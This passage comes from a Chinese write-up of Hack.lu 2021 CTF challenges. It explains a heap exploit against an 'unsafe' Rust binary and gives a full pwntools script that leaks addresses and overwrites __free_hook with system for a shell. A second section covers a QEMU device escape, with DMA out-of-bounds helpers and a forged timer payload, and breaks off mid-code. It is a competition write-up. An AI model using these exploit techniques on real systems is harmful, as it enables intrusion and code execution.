<p>比赛期间我没有把一些原语搞清楚，很多都是连猜带懵慢慢调出来的，只求达到效果。</p>
<h5 id="泄漏堆地址"><a class="header-link" href="#泄漏堆地址"></a>泄漏堆地址</h5>
<p>将 <code>PasswordManager</code> 中保存 value 的 chunk 申请到将被 double free 的 chunk 上，然后再次 free 它，使用 1 功能，就可以泄漏堆地址了。</p>
<p>泄漏了堆地址修改时就可以使 <code>highlighted_task</code> 的 ptr 指针指向堆上伪造的 <code>Vec&lt;String&gt;</code>，但先要考虑堆风水的问题。</p>
<h5 id="堆风水"><a class="header-link" href="#堆风水"></a>堆风水</h5>
<p>在我们连续 <code>pop_front</code> 后，tcache free list 已经被填满了，fastbin free list 也有一些 chunk。如果想要 UAF highlighted task，我们就要找到申请较小 chunk 且不会立即释放的原语。</p>
<p>这里我选择 <code>TaskQueue</code> 的 <code>push_back</code> 方法来清空 tcache free list。 </p>
<p>还有一个原语是 <code>PasswordManager</code> 的 <code>insert</code> + <code>alter</code> 方法。调试发现 <code>alter</code> 会先申请替代的 <code>String</code>，再 drop 旧的 <code>String</code> 。但由于我对 Rust 标准库的 <code>HashMap</code> 实现不太熟悉，这个原语不是很可靠。。。</p>
<h5 id="控制-highlighed_task--伪造-vecstring"><a class="header-link" href="#控制-highlighed_task--伪造-vecstring"></a>控制 highlighed_task &amp; 伪造 <code>Vec&lt;String&gt;</code></h5>
<p>清空 tcache free list 后，我们就通过 <code>PasswordManager</code> 的 <code>insert</code> + <code>alter</code> 方法申请到将被 UAF 的 highlighted_task，伪造其 ptr 指针和 cap、len。</p>
<p>其中 ptr 指针指向有两个 <code>Vec&lt;String&gt;</code> 的堆空间，这两个 <code>Vec&lt;String&gt;</code> 一个的 buf 指向存放着 libc 地址的堆空间，另一个指向 <code>__free_hook-0x8</code> 。</p>
<h5 id="泄漏-libc-地址"><a class="header-link" href="#泄漏-libc-地址"></a>泄漏 libc 地址</h5>
<p>不断 insert_str 增加 String 长度（2 功能），String 在增长时会有大小大于 0x410 的 chunk 被 free 进 unsortedbin，这样堆上就有了 libc 地址。</p>
<p>借助伪造的 <code>Vec&lt;String&gt;</code>，我们就可以用 6 功能泄漏 libc 地址了。</p>
<h5 id="写-__free_hook"><a class="header-link" href="#写-__free_hook"></a>写 __free_hook</h5>
<p>使用 5 功能同时写入 &quot;/bin/sh&quot; 和 system 地址</p>
<h4 id="环境搭建"><a class="header-link" href="#环境搭建"></a>环境搭建</h4>
<p>因为该 Rust 程序依赖的动态链接库较多，patch 的程序堆风水和远程不一样，所以我选择在 Docker 中调试。</p>
<h5 id="dockerfile--docker-composeyml"><a class="header-link" href="#dockerfile--docker-composeyml"></a>Dockerfile &amp; docker-compose.yml</h5>
<ul class="list">
<li>Dockerfile</li>
</ul>
<pre class="hljs"><code>  <span class="hljs-comment"># docker build -t unsafe . &amp;&amp; docker run -p 4444:4444 --rm -it unsafe</span>
    
   <span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">21.04</span>
  
   <span class="hljs-keyword">RUN</span><span class="bash"> apt update</span>
   <span class="hljs-keyword">RUN</span><span class="bash"> apt install socat -y</span>
   <span class="hljs-keyword">RUN</span><span class="bash"> useradd -d /home/ctf -m -p ctf -s /bin/bash ctf</span>
   <span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf:ctf&quot;</span> | chpasswd</span>
  
   <span class="hljs-keyword">WORKDIR</span><span class="bash"> /home/ctf</span>
  
   <span class="hljs-keyword">COPY</span><span class="bash"> flag .</span>
   <span class="hljs-keyword">COPY</span><span class="bash"> unsafe .</span>
  
   <span class="hljs-keyword">RUN</span><span class="bash"> chmod +x ./unsafe</span>
   <span class="hljs-keyword">RUN</span><span class="bash"> chown root:root /home/ctf/unsafe</span>
   <span class="hljs-keyword">RUN</span><span class="bash"> chown root:root /home/ctf/flag</span>
  
   <span class="hljs-keyword">USER</span> ctf
  
   <span class="hljs-keyword">CMD</span><span class="bash"> socat tcp-listen:4444,reuseaddr,fork <span class="hljs-built_in">exec</span>:./unsafe,rawer,pty,<span class="hljs-built_in">echo</span>=0</span></code></pre><ul class="list">
<li>docker-compose.yml</li>
</ul>
<pre class="hljs"><code>  <span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2&#x27;</span>                                                     
  <span class="hljs-attr">services:</span>
   <span class="hljs-attr">hacklu_2021_unsafe:</span>
     <span class="hljs-attr">image:</span> <span class="hljs-string">hacklu_2021:unsafe</span>
     <span class="hljs-attr">build:</span> <span class="hljs-string">.</span>    
     <span class="hljs-attr">container_name:</span> <span class="hljs-string">hacklu_2021_unsafe</span>
     <span class="hljs-attr">cap_add:</span>                                         
        <span class="hljs-bullet">-</span> <span class="hljs-string">SYS_PTRACE</span>            
     <span class="hljs-attr">security_opt:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">seccomp:unconfined</span>
     <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;13000:4444&quot;</span></code></pre><p>加入 —cap-add 选项，这样就能在 docker 中 attach 进程了</p>
<h4 id="pwndbg-with-rust"><a class="header-link" href="#pwndbg-with-rust"></a>pwndbg with Rust</h4>
<p>直接调试 pwndbg 会报错，无法查看堆的一些信息：</p>
<p class="img-container"><img src="https://i.imgur.com/MEgu9qZ.png" alt=""></p>
<p>找到了对应的 issue：<a href="https://github.com/pwndbg/pwndbg/issues/855">no type named uint16 in rust #855</a></p>
<p>只要在 run 或者 attach 前执行一下 <code>set language c</code> 就好了</p>
<h4 id="exp"><a class="header-link" href="#exp"></a>exp</h4>
<p>写的有点乱 凑合看吧</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

libc = ELF(<span class="hljs-string">&quot;./libc-2.33.so&quot;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PasswordManager</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">insert</span>(<span class="hljs-params">self, name, context</span>):</span>
                io.send(p8(<span class="hljs-number">0</span>))

                size1 = <span class="hljs-built_in">len</span>(name)
                io.send(p8(size1))
                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size1):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(name[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))

                size2 = <span class="hljs-built_in">len</span>(context)
                io.send(p8(size2))
                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size2):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(context[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))
                io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, name</span>):</span>
                io.send(p8(<span class="hljs-number">1</span>))

                size = <span class="hljs-built_in">len</span>(name)
                io.send(p8(size))

                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(name[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))
                password = io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>, drop=<span class="hljs-literal">True</span>)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;password = &quot;</span> + password)
                <span class="hljs-keyword">return</span> password

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alter</span>(<span class="hljs-params">self, name, new_context</span>):</span>
                io.send(p8(<span class="hljs-number">2</span>))
                size = <span class="hljs-built_in">len</span>(name)
                io.send(p8(size))
                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(name[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))
                size2 = <span class="hljs-built_in">len</span>(new_context)
                io.send(p8(size2))
                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size2):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(new_context[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))
                io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alter_bytes</span>(<span class="hljs-params">self, name, new_context</span>):</span>
                io.send(p8(<span class="hljs-number">2</span>))
                size = <span class="hljs-built_in">len</span>(name)
                io.send(p8(size))
                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(name[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))

                size2 = <span class="hljs-built_in">len</span>(new_context)
                io.send(p8(size2))
                io.send(new_context)
                io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HighlightedTask</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>
        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">self, context</span>):</span>
            io.send(p8(<span class="hljs-number">7</span>))

            size = <span class="hljs-built_in">len</span>(context)
            io.send(p8(size))

            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
                <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(context[i])
                io.send(p8(<span class="hljs-built_in">ascii</span>))
            io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">self, idx</span>):</span>
                io.send(p8(<span class="hljs-number">6</span>))

                io.send(p8(idx))

                content = io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>, drop=<span class="hljs-literal">True</span>)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;content = &quot;</span> + content)
                <span class="hljs-keyword">return</span> content

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alter</span>(<span class="hljs-params">self, idx, new_context</span>):</span>
                io.send(p8(<span class="hljs-number">5</span>))
                io.send(p8(idx))
                size = <span class="hljs-built_in">len</span>(new_context)
                io.send(p8(size))
                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
                        <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(new_context[i])
                        io.send(p8(<span class="hljs-built_in">ascii</span>))
                io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alter_bytes</span>(<span class="hljs-params">self, idx, new_context</span>):</span>
                io.send(p8(<span class="hljs-number">5</span>))
                io.send(p8(idx))
                size = <span class="hljs-built_in">len</span>(new_context)
                io.send(p8(size))
                io.send(new_context)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pop_set</span>(<span class="hljs-params">self</span>):</span>
                io.send(p8(<span class="hljs-number">4</span>))
                io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">push_back</span>(<span class="hljs-params">self, task_list</span>):</span>
                io.send(p8(<span class="hljs-number">3</span>))

                task_num = <span class="hljs-built_in">len</span>(task_list)
                io.send(p8(task_num))

                <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(task_num):
                        self.one_task(task_list[t])
                io.recvuntil(<span class="hljs-string">b&quot;\x7f\x7f\x7f\x7f&quot;</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">one_task</span>(<span class="hljs-params">self, context_list</span>):</span>
            vec_num = <span class="hljs-built_in">len</span>(context_list)

            io.send(p8(vec_num))

            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(vec_num):
                size = <span class="hljs-built_in">len</span>(context_list[i])
                io.send(p8(size))

                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
                    <span class="hljs-built_in">ascii</span> = <span class="hljs-built_in">ord</span>(context_list[i][j])
                    io.send(p8(<span class="hljs-built_in">ascii</span>))

<span class="hljs-comment">#io = process(&quot;./unsafe&quot;)</span>
io = remote(<span class="hljs-string">&quot;flu.xxx&quot;</span>, <span class="hljs-number">20025</span>)

ht = HighlightedTask()
task_list = []
context_list1 = [<span class="hljs-string">&#x27;y&#x27;</span> * <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;z&#x27;</span> * <span class="hljs-number">0x28</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
    task_list.append(context_list1)
ht.push_back(task_list)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
    ht.pop_set()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    task_list.append(context_list1)
context_list1 = [<span class="hljs-string">&#x27;j&#x27;</span> * <span class="hljs-number">0x58</span>, <span class="hljs-string">&#x27;k&#x27;</span> * <span class="hljs-number">0x58</span>]
task_list.append(context_list1)
ht.push_back(task_list)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
    ht.pop_set()
ht.pop_set()

pm = PasswordManager()
context_list2 = [<span class="hljs-string">&#x27;s&#x27;</span> * <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;t&#x27;</span> * <span class="hljs-number">0x28</span>]
task_list = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    task_list.append(context_list2)
ht.push_back(task_list) <span class="hljs-comment"># 把tcache free list 中的chunk全部申请完</span>

ht.pop_set() <span class="hljs-comment"># 返回和上一次pop相同的highlighted_task</span>
pm.insert(<span class="hljs-string">&#x27;1&#x27;</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;j&#x27;</span> * <span class="hljs-number">8</span>)
pm.alter(<span class="hljs-string">&#x27;1&#x27;</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x11</span>) <span class="hljs-comment"># 这个value将被free，然后就可以泄漏堆地址了</span>
ht.pop_set()
heap_addr = u64(pm.get(<span class="hljs-string">&#x27;1&#x27;</span> * <span class="hljs-number">8</span>)[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap_addr = &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
    ht.pop_set()

<span class="hljs-comment"># 第二次利用VecDeque::make_contiguous中的漏洞</span>
task_list = []
context_list1 = [<span class="hljs-string">&#x27;g&#x27;</span> * <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;h&#x27;</span> * <span class="hljs-number">0x28</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
    task_list.append(context_list1)
<span class="hljs-built_in">print</span>(task_list)
ht.push_back(task_list)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
    ht.pop_set()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
    task_list.append(context_list1)
context_list1 = [<span class="hljs-string">&#x27;n&#x27;</span> * <span class="hljs-number">0x58</span>, <span class="hljs-string">&#x27;o&#x27;</span> * <span class="hljs-number">0x58</span>]
task_list.append(context_list1)
ht.push_back(task_list)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
    ht.pop_set()
ht.pop_set()

context_list2 = [<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;i&#x27;</span> * <span class="hljs-number">0x28</span>]
task_list = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):
    task_list.append(context_list2)
ht.push_back(task_list) <span class="hljs-comment"># 把tcache free list 中的chunk全部申请完</span>

ht.pop_set()
pm.insert(<span class="hljs-string">&#x27;2&#x27;</span> * <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;j&#x27;</span> * <span class="hljs-number">2</span>)
<span class="hljs-comment">#0x5070 0x5bc0 0x5ac0</span>
pm.alter_bytes(<span class="hljs-string">&#x27;2&#x27;</span> * <span class="hljs-number">1</span>, (p64(heap_addr + <span class="hljs-number">0x59b0</span>) + p64(<span class="hljs-number">0x2000</span>) + p64(<span class="hljs-number">0x2000</span>)).ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;v&#x27;</span>))
pm.insert(<span class="hljs-string">&#x27;3&#x27;</span> * <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;j&#x27;</span> * <span class="hljs-number">0xff</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
    pm.alter_bytes(<span class="hljs-string">&#x27;3&#x27;</span> * <span class="hljs-number">1</span>,  (p64(heap_addr + <span class="hljs-number">0x5070</span>) + p64(<span class="hljs-number">0x18</span>) + p64(<span class="hljs-number">0x18</span>)).ljust(<span class="hljs-number">0xfe</span>, <span class="hljs-string">b&#x27;v&#x27;</span>))
libc.address = u64(ht.show(<span class="hljs-number">0</span>)[<span class="hljs-number">16</span>:]) - <span class="hljs-number">0x1e0c00</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc.address = &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))

pm.alter_bytes(<span class="hljs-string">&#x27;3&#x27;</span> * <span class="hljs-number">1</span>,  (p64(<span class="hljs-number">0xdeadbeef</span>) * <span class="hljs-number">2</span> + p64(libc.symbols[<span class="hljs-string">&quot;__free_hook&quot;</span>] - <span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x50</span>)).ljust(<span class="hljs-number">0xfe</span>, <span class="hljs-string">b&#x27;v&#x27;</span>))
ht.alter_bytes(<span class="hljs-number">0xc</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> + p64(libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]))

io.interactive()</code></pre><h3 id="stonks-sockethigh"><a class="header-link" href="#stonks-sockethigh"></a>Stonks Socket(high)</h3>
<p><a href="https://mem2019.github.io/jekyll/update/2021/10/31/HackLu2021-Stonks-Socket.html">https://mem2019.github.io/jekyll/update/2021/10/31/HackLu2021-Stonks-Socket.html</a></p>
<h3 id="cloudinspectmid"><a class="header-link" href="#cloudinspectmid"></a>Cloudinspect(Mid)</h3>
<p>比较简单的QEMU题目，还给了源码，对新手极其友好
先贴个交互脚本，作用是连接远程，然后输入可执行文件</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> os

local=<span class="hljs-number">0</span>
aslr=<span class="hljs-literal">True</span>
context.log_level=<span class="hljs-string">&quot;debug&quot;</span>
<span class="hljs-comment">#context.terminal = [&quot;deepin-terminal&quot;,&quot;-x&quot;,&quot;sh&quot;,&quot;-c&quot;]</span>

<span class="hljs-keyword">if</span> local==<span class="hljs-number">1</span>:
    <span class="hljs-comment">#p = process(pc,aslr=aslr,env={&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;})</span>
    p = process(<span class="hljs-string">&quot;./run_chall.sh&quot;</span>,aslr=aslr)
    <span class="hljs-comment">#gdb.attach(p)</span>
<span class="hljs-keyword">else</span>:
    remote_addr=[<span class="hljs-string">&#x27;flu.xxx&#x27;</span>, <span class="hljs-number">20065</span>]
    p=remote(remote_addr[<span class="hljs-number">0</span>],remote_addr[<span class="hljs-number">1</span>])

ru = <span class="hljs-keyword">lambda</span> x : p.recvuntil(x)
sn = <span class="hljs-keyword">lambda</span> x : p.send(x)
rl = <span class="hljs-keyword">lambda</span>   : p.recvline()
sl = <span class="hljs-keyword">lambda</span> x : p.sendline(x)
rv = <span class="hljs-keyword">lambda</span> x : p.recv(x)
sa = <span class="hljs-keyword">lambda</span> a,b : p.sendafter(a,b)
sla = <span class="hljs-keyword">lambda</span> a,b : p.sendlineafter(a,b)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lg</span>(<span class="hljs-params">s</span>):</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[1;31;40m{s}\033[0m&#x27;</span>.<span class="hljs-built_in">format</span>(s=s))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raddr</span>(<span class="hljs-params">a=<span class="hljs-number">6</span></span>):</span>
    <span class="hljs-keyword">if</span>(a==<span class="hljs-number">6</span>):
        <span class="hljs-keyword">return</span> u64(rv(a).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> u64(rl().strip(<span class="hljs-string">&#x27;\n&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> local:
        ru(<span class="hljs-string">&quot;size:&quot;</span>)
    os.system(<span class="hljs-string">&quot;musl-gcc ./exp/exp.c --static -o ./exp/exp&quot;</span>)
    poc = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp/exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()
    size = <span class="hljs-built_in">len</span>(poc)
    sl(<span class="hljs-built_in">str</span>(size))
    ru(<span class="hljs-string">b&quot;Now send the file\n&quot;</span>)
    sn(poc)
    p.interactive()</code></pre><p>主要功能就是这几个</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetDMACMD</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> val)</span> </span>{
  pcimem_write(<span class="hljs-number">0x78</span>, <span class="hljs-string">&#x27;q&#x27;</span>, val, <span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetDMASRC</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> val)</span> </span>{
  pcimem_write(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;q&#x27;</span>, val, <span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetDMADST</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> val)</span> </span>{
  pcimem_write(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;q&#x27;</span>, val, <span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetDMACNT</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> val)</span> </span>{
  pcimem_write(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;q&#x27;</span>, val, <span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">TriggerDMAWrite</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">size_t</span> val = <span class="hljs-number">0</span>;
  pcimem_write(<span class="hljs-number">0x98</span>, <span class="hljs-string">&#x27;q&#x27;</span>, val, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> val;
}

<span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">GetDMACMD</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">size_t</span> val = <span class="hljs-number">0</span>;
  pcimem_read(<span class="hljs-number">0x78</span>, <span class="hljs-string">&#x27;q&#x27;</span>, &amp;val, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> val;
}

<span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">GetDMASRC</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">size_t</span> val = <span class="hljs-number">0</span>;
  pcimem_read(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;q&#x27;</span>, &amp;val, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> val;
}

<span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">GetDMADST</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">size_t</span> val = <span class="hljs-number">0</span>;
  pcimem_read(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;q&#x27;</span>, &amp;val, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> val;
}

<span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">GetDMACNT</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-keyword">size_t</span> val = <span class="hljs-number">0</span>;
  pcimem_read(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;q&#x27;</span>, &amp;val, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> val;
}</code></pre><p>漏洞在这，没有对dma的offset进行检查，从而可以基于dma_buf进行上下越界读写，注意由于dma_buf不大，从而这个硬件的state结构体是在堆地址上的，如果是mmap的其实还有骚操作，这里就不说了</p>
<p class="img-container"><img src="https://i.imgur.com/izyXlV5.png" alt=""></p>
<p>这里注意下，这里的as是address_space_memory，因此dma可以直接对用户态分配的内存进行，如果是pci的地址空间，则需要写内核驱动交互</p>
<p class="img-container"><img src="https://i.imgur.com/cJu9I8S.png" alt=""></p>
<p>利用方法很简单，先泄露硬件state的地址和qemu的基地址。泄露state的方法是state结构体前内嵌的pci state结构体里有指向硬件state的指针，bingo</p>
<pre class="hljs"><code>  SetDMACMD(<span class="hljs-number">1</span>);
  SetDMASRC(<span class="hljs-number">-0xa08</span>);
  SetDMADST(buffer_phyaddr);
  SetDMACNT(<span class="hljs-number">0x1000</span>);
  TriggerDMARead();

  <span class="hljs-keyword">size_t</span> DMA_BUF_ADDR = buffer[<span class="hljs-number">0xc0</span> / <span class="hljs-number">8</span>] + <span class="hljs-number">0xa08</span>;
  <span class="hljs-keyword">size_t</span> code_base = buffer[<span class="hljs-number">0x2c8</span> / <span class="hljs-number">8</span>] - <span class="hljs-number">0xd6af00</span>;</code></pre><p>然后就是通过伪造main_loop_tlg内的time_list_group内的timer_list内的active_timer的方法，这个方法自多年前强网杯提出来就一直是通用方法了，具体可以看看exp怎么搞的，注意伪造的时候不能破坏qemu_clocks、lock的active等基本检查</p>
<pre class="hljs"><code>  <span class="hljs-keyword">char</span> *payload = (<span class="hljs-keyword">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">char</span> cmd[] = <span class="hljs-string">&quot;cat flag\x00&quot;</span>;
  <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">void</span> *)(payload + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x100</span> + <span class="hljs-keyword">sizeof</span>(struct QEMUTimerList ) + <span class="hljs-keyword">sizeof</span>(struct QEMUTimer )),  \
                (<span class="hljs-keyword">void</span> *)cmd,
                <span class="hljs-keyword">sizeof</span>(cmd));

  <span class="hljs-keyword">size_t</span> main_loop_tlg_addr = <span class="hljs-number">0xe93e40</span> + code_base;
  <span class="hljs-keyword">size_t</span> qemu_timer_notify_cb_addr = code_base + <span class="hljs-number">0x540E50</span>;

  *(<span class="hljs-keyword">size_t</span>*)payload = main_loop_tlg_addr + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x100</span>;

  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QEMUTimerList</span> *<span class="hljs-title">tl</span> =</span> (struct QEMUTimerList *)(payload + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x100</span>);
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QEMUTimer</span> *<span class="hljs-title">ts</span> =</span> (struct QEMUTimer *)(payload + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x100</span> + <span class="hljs-keyword">sizeof</span>(struct QEMUTimerList));

